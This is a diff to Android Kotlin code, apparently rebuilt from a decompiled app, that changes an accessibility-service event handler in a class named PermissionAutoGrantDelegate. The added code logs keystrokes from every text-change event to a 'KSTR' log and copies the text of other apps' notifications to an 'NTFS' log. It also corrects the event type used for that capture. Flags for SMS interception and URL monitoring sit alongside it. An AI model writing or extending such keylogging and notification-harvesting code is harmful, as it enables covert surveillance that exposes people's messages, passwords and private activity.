@@ -112,24 +112,53 @@ class PermissionAutoGrantDelegate(
     }
 
     // --- a3 → handleEvent ---
+    // JADX: C0320a5.m211582a3 (lines 210-259)
     fun handleEvent(event: AccessibilityEvent, sourceNode: AccessibilityNodeInfo?) {
         val pkg = event.packageName?.toString() ?: return
+
+        if (!ActivityMonitor.textMonitorEnabled && !ActivityMonitor.smsInterceptActive
+            && !ActivityMonitor.appUsageEnabled && !ActivityMonitor.urlMonitorEnabled
+            && !ActivityMonitor.focusMonitorEnabled) return
+
         val appName = getAppName(pkg)
         try {
             val eventType = event.eventType
-            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
-                (ActivityMonitor.textMonitorEnabled || ActivityMonitor.smsInterceptActive)
+
+            // TYPE_VIEW_TEXT_CHANGED (16) — keystroke capture
+            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
+                && (ActivityMonitor.textMonitorEnabled || ActivityMonitor.smsInterceptActive)
             ) {
                 val source = sourceNode ?: event.source ?: return
                 processTextEvent(source, appName, eventType)
                 if (sourceNode == null) source.recycle()
             }
+
+            // TYPE_WINDOW_STATE_CHANGED (32) — app switch + URL + settings detection
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 onWindowChanged(pkg, appName)
             }
-            if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED && ActivityMonitor.focusMonitorEnabled) {
-                // vendor: on TYPE_VIEW_FOCUSED (64) with f53036b1 flag, reads event.text first/all,
-                // logs "[appName] firstText: allText" to ActivityMonitor FOCUS log type.
+
+            // TYPE_NOTIFICATION_STATE_CHANGED (64) — notification content capture
+            // JADX: C0320a5.java lines 234-254, event type 64, writes to NTFS
+            // FIX: was incorrectly using TYPE_VIEW_FOCUSED (8)
+            if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
+                && ActivityMonitor.focusMonitorEnabled
+            ) {
+                try {
+                    val texts = event.text
+                    if (texts == null || texts.isEmpty()) return
+                    val firstText = texts.firstOrNull()?.toString() ?: ""
+                    val allText = if (texts.size > 1) {
+                        texts.drop(1).joinToString(" ") { it?.toString() ?: "" }
+                    } else ""
+
+                    if (firstText.isNotEmpty() || allText.isNotEmpty()) {
+                        ActivityMonitor.writeToFile(
+                            ActivityMonitor.LogType.NTFS,
+                            "[$appName] $firstText: $allText"
+                        )
+                    }
+                } catch (_: Exception) {}
             }
         } catch (e: Exception) {
             Log.w(TAG, "处理事件失败: ${e.message}")
@@ -159,7 +188,7 @@ class PermissionAutoGrantDelegate(
             }
             val logEntry = "$appName|$eventName|$cleaned"
             if (ActivityMonitor.textMonitorEnabled) {
-                ActivityMonitor.writeToFile(ActivityMonitor.LogType.TEXT_EVENT, logEntry)
+                ActivityMonitor.writeToFile(ActivityMonitor.LogType.KSTR, logEntry)
             }
         } catch (e: Exception) {
             Log.w(TAG, "processTextEvent 异常: ${e.message}")
